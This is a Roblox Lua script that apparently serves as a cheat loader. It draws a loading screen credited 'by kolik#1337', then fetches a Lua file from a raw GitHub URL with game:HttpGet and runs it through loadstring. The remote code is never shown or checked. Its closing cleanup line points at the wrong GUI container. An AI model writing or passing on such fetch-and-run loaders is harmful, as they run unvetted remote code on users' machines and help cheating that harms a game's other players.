

local loading = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")



loading.Name = "loading"
loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

Frame.Parent = loading
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.Position = UDim2.new(0.331848562, 0, 0.320408165, 0)
Frame.Size = UDim2.new(0, 302, 0, 175)

Frame_2.Name = "Frame"
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BackgroundTransparency = 1.000
Frame_2.Position = UDim2.new(-0.00258853659, 0, 0.903265178, 0)
Frame_2.Size = UDim2.new(0, 302, 0, 9)
Frame_2.Image = "rbxassetid://3570695787"
Frame_2.ImageColor3 = Color3.fromRGB(79, 79, 79)
Frame_2.ScaleType = Enum.ScaleType.Slice
Frame_2.SliceCenter = Rect.new(100, 100, 100, 100)
Frame_2.SliceScale = 0.120

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.168874174, 0, -6.22222233, 0)
TextLabel.Size = UDim2.new(0, 200, 0, 50)
TextLabel.Font = Enum.Font.GothamBlack
TextLabel.Text = "kolik#1337"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 41.000

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.168874174, 0, -9.22222233, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.GothamBlack
TextLabel_2.Text = "by"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 13.000

loadstring(game:HttpGet('https://raw.githubusercontent.com/daskolik/scriptzone/repo.ichbinmusti.git/task.lua', true))() 
wait(1)
game.StarterGui.loading:Destroy()
